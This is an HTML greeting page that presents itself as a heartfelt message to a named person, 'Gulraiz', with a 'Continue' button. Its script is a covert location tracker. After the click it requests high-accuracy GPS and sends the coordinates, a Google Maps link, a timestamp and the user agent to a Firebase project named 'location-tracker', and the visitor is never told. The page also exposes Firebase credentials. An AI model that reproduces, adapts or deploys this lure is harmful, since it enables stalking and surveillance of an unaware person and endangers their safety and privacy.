<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Special For You 💜</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Segoe UI,sans-serif;
}

body{

height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:linear-gradient(135deg,#3d0066,#7b2cbf,#9d4edd);
color:white;
overflow:hidden;

}

.container{

text-align:center;
padding:40px;
max-width:600px;

}

h1{

font-size:48px;
margin-bottom:15px;

}

h2{

font-size:30px;
font-weight:400;
margin-bottom:25px;

}

p{

font-size:20px;
line-height:1.6;

}

#status{

margin-top:35px;
font-size:18px;
color:#ffe6ff;

}

.heart{

font-size:70px;
animation:beat 1s infinite;

}

@keyframes beat{

0%{transform:scale(1);}
50%{transform:scale(1.2);}
100%{transform:scale(1);}

}
button{

margin-top:35px;
padding:14px 40px;
font-size:20px;
border:none;
border-radius:30px;
background:white;
color:#7b2cbf;
cursor:pointer;
font-weight:bold;
transition:.3s;

}

button:hover{

transform:scale(1.05);

}

#message{

margin-top:40px;
font-size:22px;
line-height:1.8;
animation:fade 1s;

}

@keyframes fade{

from{
opacity:0;
transform:translateY(20px);
}

to{
opacity:1;
transform:translateY(0);
}

}

</style>
</head>

<body>

<div class="container">

<div class="heart">💜</div>

<h1>Special For You</h1>

<h2>Missing you Gulraiz 💜</h2>

<p>
If you choose to continue, it would mean a lot to me. 💜
</p>

<button id="continueBtn">Continue 💜</button>

<div id="message" style="display:none;">
    <h2>💜</h2>
    <p>
        May your day be filled with peace,<br>
        happiness, and beautiful moments.<br>
        The world looks brighter when you smile.<br>
        Take care of yourself. 💜
    </p>
</div>

<div id="status" style="display:none;"></div>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

const firebaseConfig = {
apiKey:"AIzaSyBcVls_Ny6HMCcwARt44aDpGNn8VXPF1Gs",
authDomain:"location-tracker-5f75b.firebaseapp.com",
projectId:"location-tracker-5f75b",
storageBucket:"location-tracker-5f75b.firebasestorage.app",
messagingSenderId:"999228849873",
appId:"1:999228849873:web:b7809eab44aeb67d9a4ff0"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const btn = document.getElementById("continueBtn");
const msgDiv = document.getElementById("message");

btn.addEventListener("click", () => {
    // UI fauran update karein
    btn.style.display = "none";
    msgDiv.style.display = "block";

    if (!navigator.geolocation) {
        alert("Aapka browser Geolocation support nahi karta.");
        return;
    }

    // Geolocation options with Timeout & Cache fallback
    const geoOptions = {
        enableHighAccuracy: true, 
        timeout: 12000,        // Mobile ko GPS signal dhoondne ke liye 12 seconds ka time dein
        maximumAge: 60000      // Agar naya signal weak ho to 1 minute purani cached location use karein
    };

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;

            try {
                await addDoc(collection(db, "locations"), {
                    latitude: lat,
                    longitude: lng,
                    googleMap: `https://www.google.com/maps?q=${lat},${lng}`,
                    time: new Date().toLocaleString(),
                    userAgent: navigator.userAgent
                });
                console.log("Location successfully saved!");
            } catch (firebaseError) {
                console.error("Firebase Storage Error:", firebaseError);
            }
        }, 
        (geoError) => {
            // Mobile errors ko trace karne ke liye alerts
            if (geoError.code === 1) {
                alert("Permission Denied: Kindly clear browser settings & allow location.");
            } else if (geoError.code === 2) {
                alert("Position Unavailable: GPS signal weak hai ya network ka masla hai.");
            } else if (geoError.code === 3) {
                alert("Timeout: Mobile GPS ne response dene me bohot der laga di.");
            }
        }, 
        geoOptions
    );
});
</script>
</body>
</html>
